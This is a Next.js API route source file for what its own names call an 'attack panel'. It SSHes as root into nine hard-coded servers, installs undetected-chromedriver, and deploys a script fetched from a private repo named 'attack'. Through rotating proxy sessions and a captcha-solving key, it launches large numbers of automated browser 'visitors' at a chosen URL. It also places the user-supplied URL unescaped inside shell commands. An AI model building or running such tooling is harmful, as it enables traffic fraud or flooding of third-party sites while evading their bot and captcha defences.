import { NextResponse } from 'next/server';
import { Client } from 'ssh2';


const DEFAULT_SERVERS = [
  { host: '138.68.141.40', username: 'root' },
  { host: '144.126.234.13', username: 'root' },
  { host: '46.101.52.177', username: 'root' },
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '167.71.135.147', username: 'root' },
  { host: '138.68.141.255', username: 'root' },
  { host: '206.189.21.125', username: 'root' }
];

const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && apt-get update -y && apt-get install -y python3 python3-pip wget gnupg2 unzip libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 fonts-liberation xdg-utils && (apt-get install -y libasound2 2>/dev/null || apt-get install -y libasound2t64 2>/dev/null || true) && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt-get install -y ./google-chrome-stable_current_amd64.deb 2>/dev/null; rm -f google-chrome-stable_current_amd64.deb && pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" --break-system-packages 2>/dev/null || pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" && echo SETUP_COMPLETE';

function buildRelayScript(proxyHost, proxyPort, proxyUser, proxyPass) {
  const lines = [
    '#!/usr/bin/env python3',
    'import asyncio, base64, random, string',
    'PROXY_HOST = "' + proxyHost + '"',
    'PROXY_PORT = ' + proxyPort,
    'PROXY_USER = "' + proxyUser + '"',
    'PROXY_PASS = "' + proxyPass + '"',
    'LISTEN_PORT = 18080',
    'LISTEN_HOST = "0.0.0.0"',
    'BUFFER_SIZE = 65536',
    'def get_session_auth():',
    '    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))',
    '    pw = f"{PROXY_PASS}_session-{sid}"',
    '    return base64.b64encode(f"{PROXY_USER}:{pw}".encode()).decode()',
    'async def pipe(r, w):',
    '    try:',
    '        while True:',
    '            data = await asyncio.wait_for(r.read(BUFFER_SIZE), timeout=60)',
    '            if not data: break',
    '            w.write(data)',
    '            await w.drain()',
    '    except: pass',
    'async def handle_client(cr, cw):',
    '    pw = None',
    '    try:',
    '        req = b""',
    '        while b"\\r\\n\\r\\n" not in req:',
    '            chunk = await asyncio.wait_for(cr.read(BUFFER_SIZE), timeout=15)',
    '            if not chunk: cw.close(); return',
    '            req += chunk',
    '        first = req.split(b"\\r\\n")[0].decode()',
    '        method = first.split()[0]',
    '        auth = get_session_auth()',
    '        pr, pw = await asyncio.wait_for(asyncio.open_connection(PROXY_HOST, PROXY_PORT), timeout=10)',
    '        if method == "CONNECT":',
    '            target = first.split()[1]',
    '            pw.write(f"CONNECT {target} HTTP/1.1\\r\\nHost: {target}\\r\\nProxy-Authorization: Basic {auth}\\r\\nProxy-Connection: keep-alive\\r\\n\\r\\n".encode())',
    '            await pw.drain()',
    '            resp = b""',
    '            while b"\\r\\n\\r\\n" not in resp:',
    '                chunk = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=10)',
    '                if not chunk: break',
    '                resp += chunk',
    '            if b"200" in resp.split(b"\\r\\n")[0]:',
    '                cw.write(b"HTTP/1.1 200 Connection Established\\r\\n\\r\\n")',
    '                await cw.drain()',
    '                await asyncio.gather(pipe(cr, pw), pipe(pr, cw))',
    '            else:',
    '                cw.write(resp)',
    '                await cw.drain()',
    '        else:',
    '            lines2 = req.split(b"\\r\\n")',
    '            new_lines = [lines2[0]]',
    '            for line in lines2[1:]:',
    '                if line.lower().startswith(b"proxy-authorization"): continue',
    '                new_lines.append(line)',
    '            new_lines.insert(1, f"Proxy-Authorization: Basic {auth}".encode())',
    '            pw.write(b"\\r\\n".join(new_lines))',
    '            await pw.drain()',
    '            while True:',
    '                data = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=30)',
    '                if not data: break',
    '                cw.write(data)',
    '                await cw.drain()',
    '    except: pass',
    '    finally:',
    '        try: cw.close()',
    '        except: pass',
    '        try:',
    '            if pw: pw.close()',
    '        except: pass',
    'async def main():',
    '    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT, limit=BUFFER_SIZE, backlog=1024)',
    '    print(f"Relay on {LISTEN_HOST}:{LISTEN_PORT}", flush=True)',
    '    async with server: await server.serve_forever()',
    'if __name__ == "__main__": asyncio.run(main())',
  ];
  return lines.join('\n');
}

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          // ignore stderr
        });

        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers, proxies, captchaApiKey } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // Fetch latest visit.py from GitHub (private repo with token)
      let scriptB64;
      try {
        const ghToken = process.env.GITHUB_TOKEN;
        if (!ghToken) throw new Error('GITHUB_TOKEN not set in environment');
        const ghResp = await fetch('https://api.github.com/repos/fanarali881-eng/attack/contents/visit.py', {
          headers: {
            'Accept': 'application/vnd.github.v3.raw',
            'Authorization': `Bearer ${ghToken}`,
            'User-Agent': 'attack-panel'
          }
        });
        if (!ghResp.ok) throw new Error(`GitHub API returned ${ghResp.status}`);
        const scriptContent = await ghResp.text();
        scriptB64 = Buffer.from(scriptContent).toString('base64');
      } catch(e) {
        return NextResponse.json({ error: 'Could not fetch visit.py from GitHub: ' + e.message }, { status: 500 });
      }
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
          const r = await runSSHCommand(server, deployCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      if (!url) return NextResponse.json({ error: "URL is required" }, { status: 400 });
      const totalVisitors = visitors || 100;
      const serverCount = serverList.length;
      const perServer = Math.ceil(totalVisitors / serverCount);
      const captchaArg = captchaApiKey || '';

      // Build the full start command - kill old, deploy relay, start attack - ALL IN ONE SSH command
      const proxyConfig = (proxies && proxies.length > 0) ? proxies[0] : null;
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          let fullCmd = '';
          
          // Kill old processes
          fullCmd += 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "proxy_relay.py") 2>/dev/null; killall -9 chrome chromedriver 2>/dev/null; fuser -k 18080/tcp 2>/dev/null; rm -f /root/visit_status.json /root/visit.log /root/attack.log; sleep 1; ';
          
          // Deploy and start proxy relay
          if (proxyConfig) {
            const relayScript = buildRelayScript(proxyConfig.host, proxyConfig.port, proxyConfig.username, proxyConfig.password);
            const relayB64 = Buffer.from(relayScript).toString('base64');
            fullCmd += 'fuser -k 18080/tcp 2>/dev/null; echo "' + relayB64 + '" | base64 -d > /root/proxy_relay.py && nohup python3 /root/proxy_relay.py > /root/relay.log 2>&1 & sleep 2; ';
          }
          
          // Start attack
          if (proxies && proxies.length > 0) {
            const proxyB64 = Buffer.from(JSON.stringify(proxies)).toString('base64');
            fullCmd += `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${perServer} /root/proxies.json "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
          } else {
            fullCmd += `nohup python3 /root/visit.py "${url}" ${perServer} "" "${captchaArg}" > /root/visit.log 2>&1 & echo "Started PID=$!"`;
          }
          
          const r = await runSSHCommand(server, fullCmd, 12000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "proxy_relay.py") 2>/dev/null; killall -9 chrome chromedriver 2>/dev/null; killall -9 chromium 2>/dev/null; rm -f /root/visit_status.json /root/attack.log; echo "Stopped"', 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else {
      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
